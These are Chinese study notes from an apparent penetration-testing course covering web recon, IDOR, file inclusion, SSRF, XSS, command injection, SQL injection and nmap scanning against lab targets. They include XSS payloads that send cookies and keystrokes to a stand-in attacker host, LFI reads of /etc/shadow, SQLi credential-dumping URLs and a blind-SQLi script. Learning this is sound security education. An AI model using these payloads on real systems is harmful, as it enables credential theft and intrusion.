# Jr Penetration Tester
## [网络安全简介](https://github.com/MasterandRoot/Learn-THM/blob/main/Pre%20Security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%80%E4%BB%8B.md)

## 渗透测试简介
### 渗透基础知识
- 什么是渗透测试
  - 遵守法律和道德
- 渗透测试道德
  - 白帽、灰帽、黑帽
  - ROE (Rules of Engagement)
    - 渗透测试参与的初始阶段创建的文档
    - 许可、测试范围、使用手段
    - [文档示例](https://sansorg.egnyte.com/dl/bF4I3yCcnt/?)
- 渗透测试框架
  - OSSTMM(The Open Source Security Testing Methodology Manual)
  - OWASP
    - 专注于Web安全
  - NIST Cybersecurity Framework 1.1(2.0)
  - NCSC CAF
- 黑、白、灰盒测试
### 安全原则
- CIA 三原则
  - 机密性、完整性、可用性
- 特权原则
  - PIM(特权身份管理)
  - PAM(特权帐户管理)
-安全模型
  - The Bell-La Padula Model
    - 状态机模型
    - 用于在政府和军事应用中实施访问控制
    - 能够自上而下，不能自下而上
    - 主要实现机密性
  - Biba Model
    - 能够自下而上，不能自上而下
## Web安全简介
### 遍历Web应用
- 探索网站
  - 通过浏览器浏览网站并记下各个页面/区域/功能，并为每个页面/区域/功能提供摘要。
    - homepage `/`
    - latest news `/news`
    - news article `/news/article?id=1`
    - ...
- 查看网页源代码
  - `<!-- 这是注释 -->`
  - 查看链接
  - 外部文件所在文件夹
  - 框架版本漏洞
- 开发者工具
  - 检查元素
  - 网络
  - 源代码
### 内容发现(Content Discovery)
- 什么是内容发现
  - 内容发现的三种方式
    - 手动(Manually)
    - 自动(Automated)
    - 开源情报(OSINT)   
- Manually - Robots.txt
  - 该文件是告诉搜索引擎哪些页面能够访问，哪些不允许访问
  - [robots.txt详解](https://developers.google.com/search/docs/crawling-indexing/robots/intro)
- Manually - Favicon
  - 标题栏的小图标
  - 当使用框架构建网站时，作为安装一部分的图标会留下。
  - 如果网站开发人员没有用自定义图标替换它，这可以让我们了解正在使用的框架。OWASP 托管一个常见框架图标的数据库，您可以使用它来检查目标 [favicon](https://wiki.owasp.org/index.php/OWASP_favicon_database) 使用的框架
  - 一旦我们知道了框架，我们就可以使用外部资源来发现更多关于它的信息。
- Manually - Sitemap.xml
  - 站点地图
  - 包含您希望机器人发现和访问的网站上所有页面的列表
- Manually - HTTP头
  - `curl http://ip -v`
  - 可能包含一些有用的信息
    - 服务器版本
    - 使用的语言
    - ...
- Manually - 框架发现
  - 查找框架文档，发现类似于后台、管理台等入口。
- OSINT - Google Hacking / Dorking
  - `site`  查找只来自该网站的结果
  - `inurl` 查找url包含相关关键词的结果
  - `filetype`  查找文件类型
  - `intitle`  查找文件标题
- OSINT - Wappalyzer
  - [Wappalyzer](https://www.wappalyzer.com/) 是一种在线工具和浏览器扩展程序，可帮助识别网站使用的技术，例如框架、内容管理系统 (CMS)、支付处理器等等，它甚至可以也可以找到版本号。
- OSINT - Wayback Machine
  - [ Wayback Machine ]( https://archive.org/web/ ) 是可追溯到 90 年代后期的网站历史档案。您可以搜索一个域名，它会一直显示该服务抓取网页并保存内容的所有时间。
  - 该服务可以帮助发现在当前网站上可能仍处于活动状态的旧页面。
- OSINT - GitHub
- OSINT - S3 Buckets
  - S3 Buckets是amzon提供的一项服务，能够把静态内容存储到云上。
  - 如果权限配置不正确，这些静态内容就能够被访问。
- Automated 
  - 好用的 [wordlists.txt](https://github.com/danielmiessler/SecLists)
  - ffuf
    - `ffuf -w wordlists.txt -u http://ip`
  - dirb
    - `dirb http://ip wordlists.txt`
  - Gobuster
    - `gobuster dir --url http://ip -w wordlists.txt`
### 子域枚举
- 简介
  - 为了扩大我们的攻击面，以尝试发现更多潜在的漏洞点
  - 常见方法
    - 蛮力(Brute Force)
    - 开源情报(OSINT)
    - 虚拟主机(Virtual Host)
- OSINT - SSL/TLS证书
  - 使用 CA 为每个申请证书创建 CT 日志
  - 使用 [crt.sh]( https://crt.sh )
- OSINT - Google Hacking / Dorking
  - 上节已表述。
- DNS暴力破解
  -  `dnsrecon` 工具
- OSINT - [Sublist3r](https://github.com/aboul3la/Sublist3r)
  - Sublist3r 是一个 python 工具，旨在使用 OSINT 枚举网站的子域。它帮助渗透测试人员和漏洞猎手收集和收集他们所针对的域的子域。
- 虚拟主机
  - ffuf 
    - `fuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP` 


### 绕过验证
- 用户名枚举
- 蛮力破解密码
- 程序逻辑缺陷
- cookie 篡改
  - 纯文本
    - `Set-Cookie: logged_in=true; Max-Age=3600; Path=/` 
    - `Set-Cookie: admin=false; Max-Age=3600; Path=/`
  - Hash
    - 一些Cookie会使用Hash编码
    - 哈希碰撞
  - 编码
    - `base64`

### IDOR
- 什么是IDOR
  - 不安全的直接对象引用，是一种访问控制漏洞。
  - 对用户输入数据信任过高
- IDOR示例
  - 访问 `http://online-service.thm/profile?user_id=1305`,能够访问用户个人信息
  - 尝试 `http://online-service.thm/profile?user_id=1000`,能够访问其他用户的个人信息
- 编码中寻找IDORs
  ![编码](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5f2cbe5c4ab4a274420bc9a9afc9202d.png)
- 哈希中寻找IDORs
  - hash碰撞
- 在不可预测里寻找IDORs
  - 如果上述两种方法无法检查到ID,则一种优秀的方式是申请两个账户并在他们之间交换ID,以此寻找IDOR漏洞。
### File Inclusion（文件包含）
- 简介
  ![文件包含示例](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png)
  - 文件包含成因
    - 主要原因是未输入验证。用户输入未经验证审核。
  - 影响
    - 利用漏洞读取敏感信息
    - 利用漏洞挂马
- 路径遍历
  - 也被成为目录遍历
  - 示例
  ![目录遍历示例](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/45d9c1baacda290c1f95858e27f740c9.png)
  - 上述也被称为 `dot-dot-slash` 攻击
  - 利用 `../` 
  - 常见的系统文件
    - `/etc/issue`
      - 系统登陆前的提示信息
    - `/proc/version`
      - 系统内核版本
    - `/etc/passwd`
      - 有权访问系统的所有注册用户
    - `/etc/shadow`
      - 有权访问系统用户的密码
    - `C:\boot.ini`
      - 包含具有 BIOS 固件的计算机的引导选项
- LFI(本地文件包含)
  - `http://webapp.thm/get.php?lang=/etc/passwd`
  - `http://webapp.thm/index.php?lang=../../../../etc/passwd`
  - php在低于5.3.4版本上 `%00` 截断
    - url编码的问题？
  - 关键字过滤
  - 关键字替换
    - php的匹配规则

    ![php匹配规则](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png)
- RFI(远程文件包含)
  - php打开 `allow_url_fopen` 选项
  - RFI示例

  ![RFI示例](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png)
- FI防范建议
  - 更新最新版本
  - 关闭后端错误提醒
  - 关闭不必要的配置选项
  - 用户输入验证
  - 文件访问白名单
- 挑战
  - 通过 `GET` `POST` `Cookie` `Http Headers` 发现入口点
  - 有效输入查看系统表现
  - 无效输入，包括特殊字符
  - 涉及url编码问题，尝试在浏览器url框或Burp
  - 测试是否有过滤器
  - flag1
    - 使用Burp更改 `GET` 为 `POST`
  - flag2 
    - 查看cookie
      - 只验证是否包含 `guest`字符，即使用`guest123`也能绕过验证
    - 基本的 `%00` 截断
  - flag3
    - 根据提示，web后台使用 `$_REQUESTS` 接收HTTP请求。
      -  `$_REQUESTS` 超全局变量的特性，是 `$_GET`  `$_POST`  `$_COOKIE` 的合集，而且数据是复制过去的，并不是引用。
    - 测试后发现过滤，过滤后只接受字母。
    - 根据`$_REQUESTS`的特性，将方法改为 `POST` 后，发现过滤失效
    - 基本的 `%00` 截断
  - php获取hostname
    - 版本不同，使用不同的语句



### SSRF
- 简介
  - 服务端请求伪造
  - 指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。
  - SSRF攻击通常针对外部网络无法直接访问的内部系统。
  - 两种形式
    - 常规SSRF，数据回显到攻击者屏幕
    - 盲SSRF，数据不回显
- SSRF示例
  - 示例1

  ![SSRF示例1](https://static-labs.tryhackme.cloud/sites/ssrf-examples/images/ssrf_1.png)
    - 请求完整的url时，把url更改为攻击载荷url
  - 示例2

  ![SSRF示例2](https://static-labs.tryhackme.cloud/sites/ssrf-examples/images/ssrf_2.png)
    - 示例显示了攻击者如何仅通过利用目录遍历来控制路径仍然可以到达 `/api/user` 页面。 
    - 当 website.thm 收到 `../` 时，这是一条向上移动目录的消息，该目录删除请求的 `/stock` 部分并将最终请求变为 `/api/user`
  - 示例3

  ![SSRF示例3](https://static-labs.tryhackme.cloud/sites/ssrf-examples/images/ssrf_3.png)
    - 该示例显示攻击者可以控制发出请求的服务器子域
    - 预期访问url`http://website.thm/stock?server=api&id=123`
      - 该请求到达服务器后，服务器根据`server=api`使用子域名`api.website.thm/api/stock/item?id=123`
    - 使用 `&x=` 阻止剩余路径附加到攻击者 URL 的末尾，而是将其转换为查询字符串中的参数 (?x=)。
  - 示例4

  ![SSRF示例4](https://static-labs.tryhackme.cloud/sites/ssrf-examples/images/ssrf_4.png)
    - 与示例1类似，攻击者可以改为强制网络服务器请求攻击者选择的服务器。
    - 通过这样做，我们可以捕获发送到攻击者指定域的请求标头。 
    - 这些标头可能包含由 website.thm 发送的身份验证凭据或 API 密钥（通常会向 api.website.thm 进行身份验证）
  - challenge
    - 与示例3类似，构造`https://website.thm/item/8?server=server.website.thm/flag?id=9&x=`

- 发现SSRF漏洞
  - 可以通过许多不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。
  - 四个常见位置的示例
    - 在URL中使用完整的URL时
      - `http://website.thm/form?server=http://server.website.thm/store`
    - 表单的隐藏字段
      - `<input type="hidden" name="server" value="http://server.website.thm/store">`
    - 部分 URL，例如主机名
      - `http://website.thm/form?server=api`
    - 只是路径
      - `http://website.thm/form?dst=/forms/contact`
- SSRF防御手段
  - Deny List
    - Web应用程序可以使用该手段来保护敏感端点、IP 地址或域不被公众访问，同时仍然允许访问其他位置。
    - 最常使用的是 `localhost` `127.0.0.1`等
    - 如何绕过
      - 使用 `0` `0.0.0.0` `127.1` `127.*.*.*` `2130706433` `127.0.0.1.nip.io` 等
    - 在云环境里，禁止 `169.254.169.254` 的访问
  - Allow List
    - 允许列表是拒绝所有请求的地方，除非它们出现在列表中或匹配特定模式，例如参数中使用的 URL 必须以 `https://website.thm` 开头的规则。 
    - 如何绕过
      - 攻击者可以通过在攻击者的域名上创建子域来快速规避此规则，例如 `https://website.thm.attackers-domain.thm`。
      - 应用程序逻辑现在将允许此输入并让攻击者控制内部HTTP请求。
  - 重定向
    - 如果上述绕过方法不起作用，攻击者还可以使用另一种技巧，即开放重定向。- 开放重定向是服务器上的一个端点，网站访问者可以在该端点自动重定向到另一个网站地址。以链接 https://website.thm/link?url=https://tryhackme.com 为例。
    - 创建此端点是为了记录访问者出于广告/营销目的点击此链接的次数。
    - 但想象一下，存在一个潜在的 SSRF 漏洞，它具有严格的规则，只允许以 https://website.thm/ 开头的 URL。
    - 攻击者可以利用上述功能将内部HTTP请求重定向到攻击者选择的域。
- SSRF实践
  - 内容发现
    - `gobuster dir --url http://ip -w wordlists.txt`
    - 发现两个路径
      - `/private` 拒绝访问
      - `/customers/new-account-page` 新版的用户账户界面，允许客户选择头像
  - 访问 `http://ip/customers/new-account-page` ,通过查看头像表单的页面源，发现头像表单 Value 值包含图像的路径。
  - 更改头像后，发现头像被base64编码后储存在前端
  - 更改头像表单 Value 值，`/private` ,发现拒绝访问。
  - 使用 `x/../private` 绕过,得到 `/private` 中base64编码的内容，解码。

### Cross-site Scripting(XSS)
- 简介
- XSS Payloads
  - 常见的有效载荷
    - 验证，是否存在XSS
    ```JavaScript 
      <script>alert('XSS');</script>
    ```
    - 会话窃取
    ```JavaScript
      <script>
        fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));
      </script>
    ```
    - 按键记录器
    ```JavaScript
      <script>
        document.onkeypress = function(e) { 
            fetch('https://hacker.thm/log?key=' + btoa(e.key) );
          }
      </script>
    ```
- Reflected XSS
  - 当用户在HTTP请求中提供的数据未经任何验证就包含在网页源中时，就会发生反射型 XSS
  - 常见测试位置
    - URL中的查询参数
    - 网址文件路径
    - 在HTTP标头
- Stored XSS
  - 常见测试位置
    - 博客评论
    - 用户档案信息
    - 网站列表
- 基于DOM的XSS
  - DOM
    - DOM指文件对象模型，是HTML和XML文档的编程接口。

    ![HTML DOM 的图表](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png)
  - 基于 DOM 的 XSS 是 JavaScript 直接在浏览器中执行的地方，无需加载任何新页面或将数据提交给后端代码。
  - 当网站 JavaScript 代码作用于输入或用户交互时执行。
- Blind XSS
  - 类似于Stored XSS,只是攻击者看不到反射结果
  - 示例场景
    - 一个网站有一个联系表单，可以通过表单向员工发送消息。
    - 后台不会检查表单内容是否有任何恶意代码，这使攻击者可以输入他们想要的任何内容。
    - 然后，这些消息会变成工单，员工可以在后台网站上查看这些工单。
  - 潜在影响
    - 使用正确的payload，攻击者的 JavaScript 可以回调攻击者的网站，显示员工门户 URL、员工的 cookie，甚至是正在查看的门户页面的内容。
  - 流行的Blind XSS工具 [XSShunter](https://github.com/mandatoryprogrammer/xsshunter-express)
- 完善Payload
  - 级别1
    ```JavaScript 
      <script>alert('XSS');</script>
    ```
  - 级别2
    ```JavaScript
      //html文档
      <input value="123"> 
      //payload
      "><script>alert('XSS');</script>
      //结果预览
      <input value=""><script>alert('XSS');</script>"> 
    ```
    - 其中 `">` 是该payload关键。
  - 级别3
    ```JavaScript
      //html文档
      <textarea>123</textarea> 
      //payload，和级别2类似
      </textarea><script>alert('XSS');</script>
      //结果预览
      <textarea>123</textarea><script>alert('XSS');</script></textarea> 
    ```
  - 级别4
    ```JavaScript
      //html文档
      document.getElementsByClassName('name')[0].innerHTML='123';
      //payload
      ';alert('XSS');//
      //结果预览
      document.getElementsByClassName('name')[0].innerHTML='';alert('XSS');//;
    ```
  - 级别5
    ```JavaScript
      //后台过滤关键词'script'
      //payload
      <sscriptcript>alert('THM');</sscriptcript>
    ```
    - 绕过不聪明关键词过滤的技巧
      - `<sscriptcript>`
      - `....//`
      - `pphphp`

  - 级别6
    ```JavaScript
      //html文档
      <img src="scriptalert('THM');/script">
      //发现过滤了'<' '>',导致失败
      //使用 img 标签 onload属性 
      //payload
      /images/cat.jpg" onload="alert('THM');
      //结果预览
      <img src="/images/cat.jpg" onload="alert('THM');">
    ```
- Blind XSS实战
  - 一个网站有一个联系表单，可以通过表单向员工发送消息。
  - 后台不会检查表单内容是否有任何恶意代码，这使攻击者可以输入他们想要的任何内容。
  - 然后，这些消息会变成工单，员工可以在后台网站上查看这些工单。

  - paylaod
    - `</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>`
      - `fetch()` 生成 HTTP 访问
      - `btoa()` base64编码
      - `document.cookie` 当前cookie
  - 攻击者 `nc -lvnp port` 监听

### Command Injection(命令注入)
- 什么是命令注入
  - 又称RCE，远程代码执行
- 发现
  - 存在此漏洞是因为应用程序经常使用编程语言（如PHP、Python 和 NodeJS）中的函数来向计算机操作系统传递数据并在计算机操作系统上进行系统调用。
  - 例如，从字段中获取输入并在文件中搜索条目。
  
  - python实现命令注入
    ```python
    import subprocess
    from flask import Flask
    app = Flask(__name__)
    def execute_command(shell):
      return subprocess.Popen(shell,shell=Ture,stdout=subprocess.PIPE).stdout.read()
    @app.route('/<shell>')
    def command_server(shell):
      return execute_command(shell)
    ```
- 利用
  - 注入有回显
  - 注入无回显
    - `>` 
    - `curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`
  - 有效payload
    - Linux
      - `whoami`
      - `ls`
      - `sleep`
      - `nc`
    - windows
      - `whoami`
      - `dir`
      - `ping`
      - `timeout`
- 防止
  - 可以通过多种方式防止命令注入。
    - 尽可能少地使用编程语言中具有潜在危险的函数或库
    - 不依赖用户输入的情况下过滤输入
  - 下面的示例是PHP编程语言；然而，相同的原则可以扩展到许多其他语言。
  - 在PHP中，易受攻击的函数
    - `Exec`
      ```php
        exec('whoami', $output, $retval);//$retval 如果与$output一起存在，则$retval代表返回状态
      ```
    - `Passthru`
    - `System`
  - 常见过滤
    - `pattern='[0-9]+'`
    - [`filter_input`](https://www.php.net/manual/en/function.filter-input.php)
  - 绕过过滤器
    - 可以滥用应用程序背后的逻辑来绕过这些过滤器。
    - 例如，一个应用程序可能去掉引号；我们可以改用它的十六进制值来获得相同的结果。
- 实践
  ```php
    $result = passthru("/bin/ping -c 4 ".$_GET["address"]); 
  ```
  - [命令注入常用payload](https://github.com/payloadbox/command-injection-payload-list)

### SQL注入
- SQL(结构化查询语句)
  - SELECT
    - `select * from users;`
    - `select * from users LIMIT 2,1` # 跳过前两个结果,返回一个结果
    - `select * from users where username like '%mi%';`
  - UNION
    - 此查询的规则
      - UNION 语句必须在每个 SELECT 语句中检索相同数量的列
      - 这些列必须具有相似的数据类型并且列顺序必须相同
      - 注入常用
        - `select username,pass,info from users where id = 1 union select 1,2,3`
  - INSERT
    - `insert into users (username,password) values ('bob','password123');`
  - UPDATE
    - `update users SET username='root',password='pass123' where username='admin';`
- SQL注入
  - `https://website.thm/blog?id=1`
    - 后台 `SELECT * from blog where id=1 and private=0 LIMIT 1;`
    - 构造访问 `https://website.thm/blog?id=2;--`
    - 后台结果 `SELECT * from blog where id=2;-- and private=0 LIMIT 1;`
  - 三种类型
    - In-Band
    - Blind 
    - Out Of Band

- In-Band SQLi
  - Error-Based SQL Injection
    - 这种类型的 SQL 注入对于轻松获取有关数据库结构的信息最有用，因为来自数据库的错误消息会直接打印到浏览器屏幕。
    - 这通常可用于枚举整个数据库。
  - Union-Based SQL Injection
    - 这种类型的注入利用 SQL UNION 运算符和 SELECT 语句将其他结果返回到页面。
    - 此方法是通过 SQL 注入漏洞提取大量数据的最常用方法。
  - 实践
    - URL:`https://website.thm/article?id=1`
    - 后台php `select * from article where id = 1`
    - 第一步 
      - 构造URL `https://website.thm/article?id=1'`
      - 发现返回错误信息，证明存在漏洞
    - 第二步
      - 使后台返回的是数据而不是错误信息
      - 构造URL `https://website.thm/article?id=1 union select 1`,返回错误
      - 构造URL `https://website.thm/article?id=1 union select 1,2`,返回错误
      - 构造URL `https://website.thm/article?id=1 union select 1,2,3`,返回正常数据
      - 构造URL `https://website.thm/article?id=0 union select 1,2,3`,使返回结果只为 `1 2 3`,使可以开始使用这些返回值来检索更有用的信息
    - 第三步
      - 构造URL `https://website.thm/article?id=0 union select 1,2,database()` 得到数据库名称 `sqli_one`
      - 构造URL `https://website.thm/article?id=0 union select 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`  得到表名 `article` 和 `staff_users`
        - `group_concat()` 从多个返回的行中获取指定的列（例子中是 table_name）
        - `information_schema`,数据库的每个用户都可以访问它,它包含有关用户有权访问的所有数据库和表的信息
        - `table_schema`
      - 构造URL `https://website.thm/article?id=0 union select 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`  得到列名 `id` `password` 和 `username`
        - 检索的信息已从 table_name 更改为 column_name
        - information_schema 数据库中查询的表已从 tables 更改为 columns
        - 正在搜索 table_name 列的值为 staff_users的所有行
      - 构造URL `https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
        - `SEPARATOR` 分隔符

- Blind SQLi - Authentication Bypass(身份认证绕过)
  - `select * from users where username='' and password='' OR 1=1;`
- Blind SQLi - Boolean Based(基于布尔)
  - 基于布尔的 SQL 注入是指我们从注入尝试中收到的响应
    - 它可能是真/假、是/否、开/关、1/0 或任何只能有两个结果的响应
  - 该结果向我们确认了我们的 SQL 注入负载是否成功
  - 在第一次检查时，您可能会觉得这种有限的回答无法提供太多信息
  - 尽管如此，实际上，仅通过这两个响应，就可以枚举整个数据库结构和内容
  - 实践
    - 第一步
      - 访问URL`https://website.thm/checkuser?username=admin`,发现返回值 `true` 
      - 构造URL`https://website.thm/checkuser?username=admin123`,发现返回值`false`
    - 第二步
      - 使后台返回的是`true`
      - 构造URL `https://website.thm/checkuser?username=admin123 union select 1`,返回`false`
      - 构造URL `https://website.thm/checkuser?username=admin123 union select 1,2`,返回`false`
      - 构造URL `https://website.thm/checkuser?username=admin123 union select 1,2,3`,返回`true` 
    - 第三步
      - 查询数据库名，得到数据库`sqli_three`
      ```python
      import requests
      import json
      char = [chr(i) for i in range(97,123)]
      char.append('_')
      sql_name = ''
      flag = 1
      while flag == 1:
        for i in char:
          url = "http://ip/run"
          sql = "select * from users where username = 'admin123' union select 1,2,3 where database() like '" + sql_name + i +"%';-- LIMIT "
          payload = {"level":"3","sql":sql}
          info = requests.post(url,data=payload)
          if json.loads(info.text)['message'] == 'true':
            sql_name += i
            flag = 1
            print(sql_name)
            break
          else:
            flag = 0
      ```
    - 第四步
      - 查询表名，得到表名`users`
      - 核心代码 `sql = select * from users where username = 'admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
    - 第五步
      - 查询列名，得到列名`id` `username` `password`
      - 核心代码1 `sql = select * from users where username = 'admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`
      - 核心代码2 `sql = select * from users where username = 'admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`
    - 第六步
      - 查询用户名
      - 核心代码 `sql = select * from users where username = 'admin123' UNION SELECT 1,2,3 from users where username like 'a%`
    - 第七步
      - 爆破密码
      - 核心代码 `sql = select * from users where username = 'admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%'`
- Blind SQLi - Time Based(基于时间)
  - 大致思路和基于布尔的注入类似
  - 在UNION 语句中引入`SLEEP()`方法。`SLEEP()` 方法只会在 UNION SELECT 语句成功时执行。 
    - 构造URL `https://website.thm/checkuser?username=admin123 union select sleep(5)`, 未有延时
    - 构造URL `https://website.thm/checkuser?username=admin123 union select 1,sleep(5)`, 延时5s，证明查询成功
  - 步骤和基于布尔的类似。

- Out-of-Band SQLi
  - 不太常见。
- SQLi防范
  - 参数化查询
  - 用户输入验证
  - 转义用户输入

## [Burp Suite]()
- 只记录技巧

## 网络安全
### 被动侦察
- 介绍
  - 在这个模块，在我们定义了被动侦察和主动侦察之后，我们将重点介绍与被动侦察相关的基本工具。
  - 我们将学习三个命令行工具：
    - `whois` 查询 WHOIS 服务器
    - `nslookup` 查询DNS服务器
    - `dig` 查询DNS服务器
- 被动侦察和主动侦察
  - 被动侦察。无需直接与目标接触即可从公开可用资源中获取这些知识。
  - 常见活动
    - 从公共 DNS 服务器查找域的 DNS 记录
    - 检查与目标网站相关的招聘广告
    - 阅读有关目标公司的新闻文章
  - 主动侦察。主动侦察需要与目标直接接触。
  - 常见活动
    - 连接到公司服务器之一，例如 HTTP、FTP 和 SMTP
    - 致电公司试图获取信息（社会工程学）
    - 冒充修理工进入公司场所
- whois
  - `WHOIS` 是遵循 RFC 3912 规范的请求和响应协议, whois 服务器运行在TCP的43端口。
  - `whois DOMAIN_NAME`
    - `whois bilibili.com`
- nslookup and dig
  - 使用 `whois` 获得到了 Name Server
    - 以tryhackme.com为例,得到 `Name Server: uma.ns.cloudflare.com`
  - `nslookup`
    - `nslookup OPTIONS DOMAIN_NAME SERVER`
      - `OPTIONS` 查询类型
      - `DOMAIN_NAME`  查询域名
      - `SERVER`  dns服务器
    - `nslookup -type=a tryhackme.com 8.8.8.8`
  - `dig`
    - `dig @SERVER DOMAIN_NAME TYPE`
      - `SERVER` 是您要查询的 DNS 服务器
      - `DOMAIN_NAME` 是您正在查找的域名
      - `TYPE` 包含 DNS 记录类型
    - `dig @1.1.1.1 tryhackme.com A`

- [DNSDumpster](https://dnsdumpster.com/)
  - 全面详细
  - **子域名查找**
- Shodan.io
  - “钟馗之眼”
  - [TryHackMe’s Shodan.io]()
- 总结
  - 介绍了命令行工具、whois、nslookup 和 dig
  - 讨论了两个公开可用的服务 DNSDumpster 和 Shodan.io。
    - 此类工具的强大之处在于，您可以在不直接连接目标的情况下收集有关目标的信息。
    - 此外，一旦您掌握了搜索选项并习惯阅读结果，使用此类工具可能会发现大量信息。
  - 扩展
    - [DNS in detail](https://github.com/MasterandRoot/Learn-THM/blob/main/Pre%20Security/%E7%BD%91%E7%BB%9C%E5%A6%82%E4%BD%95%E8%BF%90%E8%A1%8C.md#dns%E8%AF%A6%E8%A7%A3)

### 主动侦察
- 介绍
  - 介绍命令行工具
    - `ping`
    - `traceroute`
    - `telent`
    - `nc`
  - 主动侦察始于与目标机器的直接连接
    - 任何此类连接都可能在日志中留下信息，显示客户端 IP 地址、连接时间和连接持续时间等
    - 但是，并非所有连接都是可疑的。可以让您的主动侦察显示为常规客户活动。
    - 考虑网页浏览；在数百名其他合法用户中，没有人会怀疑浏览器连接到目标网络服务器。当你作为红队（攻击者）的一部分工作时，你可以使用这些技术来发挥你的优势，并且不想惊动蓝队（防御者）

- Web浏览器
  - 开发者模式
  - 常用扩展
    - **FoxyProxy**
    - **User-Agent Switcher and Manager**
    - **Wappalyzer** 提供所访问网站使用的相关技术

- Ping
- Traceroute
  - 在Linux和 macOS 上，要使用的命令是 `traceroute MACHINE_IP`
  - 在 MS Windows 上，它是 `tracert MACHINE_IP`
- Telent
  - `Telent MACHINE_IP PORT`
  - 由于基于TCP协议，可以使用 Telnet 连接到任何服务
- Netcat
  - 类似于telent，支持UDP
  - netcat as client	`nc MACHINE_IP PORT_NUMBER`
  - netcat as server	`nc -lvnp PORT_NUMBER`


## Nmap
### Nmap Live Host Discovery
- 了解如何使用 Nmap 通过 ARP 扫描、ICMP 扫描和 TCP/UDP ping 扫描发现活动主机。
- 介绍
  - 渗透第一步，需要了解目标的基本信息，主要包括以下两点：
    1. 目标上运行的系统？
    2. 系统上运行着哪些服务？
  - Nmap 能够解决上述问题，本模块主要解决第一个问题
- 子网
  - 作为主动侦察的一部分，希望发现有关一组主机或子网的更多信息
  - 如果连接到同一个子网，您会希望您的扫描器依赖 ARP（地址解析协议）查询来发现活动主机
  - ARP 查询旨在获取硬件地址（MAC 地址），以便通过链路层进行通信；但是，我们可以使用它来推断主机在线
  - 根据 ARP 协议可知，ARP 查询不能跨越子网
  - [子网划分的更多信息](https://github.com/MasterandRoot/Learn-THM/blob/main/Pre%20Security/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80.md#%E5%B1%80%E5%9F%9F%E7%BD%91%E4%BB%8B%E7%BB%8D)
- 枚举目标
  - 在扫描之前，需要指定要扫描的目标
  - 一般来说，需要提供一个列表、范围、子网
    - 列表list: `MACHINE_IP scanme.nmap.org example.com` 将会扫描 3 个IP地址
    - 范围range: `10.11.12.15-20` 将会扫描 6 个IP地址: 10.11.12.15, 10.11.12.16,… 10.11.12.20
    - 子网subnet: `MACHINE_IP/30` 将会扫描 4 个IP地址
    - 还可以提供一个文件作为目标列表的输入，`nmap -iL list_of_hosts.txt`
  - 如果要检查 Nmap 将扫描的主机列表，使用`nmap -sL TARGETS`. 此选项将为您提供 Nmap 将在不扫描的情况下扫描的主机的详细列表
    - 然而，Nmap 将尝试对所有目标进行反向 DNS 解析以获取它们的名称，因为名字可能会向渗透测试者透露各种信息
    - 如果不想让 Nmap 进行反向 DNS 解析，可以添加`-n`
    - `nmap -sL -n 10.10.0-255.101-125` 扫描 6400 个IP地址（256 * 25)
- 发现在线主机
  - 根据TCP/IP协议分层，可以利用协议发现在线主机
  - 自下而上，可以使用：
    - 数据链路层 ARP
    - 网络层 ICMP
    - 传输层 TCP/UDP
  - 回顾四种协议
    - [ARP](https://github.com/MasterandRoot/Learn-THM/blob/main/Pre%20Security/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80.md#%E5%B1%80%E5%9F%9F%E7%BD%91%E4%BB%8B%E7%BB%8D)
      - 向网段上的广播地址发送一个帧，并要求具有特定 IP 地址的计算机通过提供其 MAC（硬件）地址来响应
    - ICMP
       - 多种类型
       - ICMP ping 使用 Type 8 (Echo) 和 Type 0 (Echo Reply)
    - TCP/UDP
      - 虽然 TCP 和 UDP 是传输层，但出于网络扫描的目的，扫描器可以将特制的数据包发送到常见的 TCP 或 UDP 端口，以检查目标是否会响应
      - 这种方法很有效，尤其是当 ICMP Echo 被阻止时
- 使用 ARP 的Nmap主机发现
  - 避免浪费时间对离线主机或未使用的 IP 地址进行端口扫描至关重要。
  - 有多种方法可以发现在线主机。当没有提供主机发现选项时，Nmap 遵循以下方法来发现活动主机：
    - 当特权用户尝试扫描本地网络（以太网）上的目标时，Nmap 使用ARP 请求
    - 当特权用户试图扫描本地网络之外的目标时，Nmap 使用 ICMP 回显请求、TCP ACK（确认）到端口 80、TCP SYN（同步）到端口 443 和 ICMP 时间戳请求
    - 当非特权用户尝试扫描本地网络之外的目标时，Nmap 通过向端口 80 和 443 发送 SYN 数据包来求助于 TCP 3 次握手
  - 默认情况，Nmap 使用 `Ping` 查找在线主机，然后仅扫描在线主机的端口。
  - 如果只想发现在线主机而不进行端口扫描，使用`namp -sn TARGETS`

